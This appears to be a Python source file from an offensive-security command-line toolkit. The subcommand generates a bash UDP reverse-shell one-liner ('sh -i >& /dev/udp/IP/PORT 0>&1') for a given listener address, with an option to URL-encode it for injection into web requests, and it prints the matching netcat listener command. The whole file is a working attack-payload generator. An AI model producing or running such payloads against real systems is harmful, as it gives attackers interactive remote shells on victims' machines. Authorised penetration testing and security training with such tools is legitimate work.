import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
def command(listener_ip, listener_port, raw, urlencode):
    """Return bash UDP reverse shell (victim side). Listener: nc -u -lvp <port>"""
    cmd = f"sh -i >& /dev/udp/{listener_ip}/{listener_port} 0>&1"
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Bash UDP reverse shell:\n\t{Fore.WHITE}{cmd}")
        click.secho(f"{Fore.LIGHTGREEN_EX}Listener:\n\t{Fore.WHITE}nc -u -lvp {listener_port}")
    else:
        click.secho(cmd, nl=False)
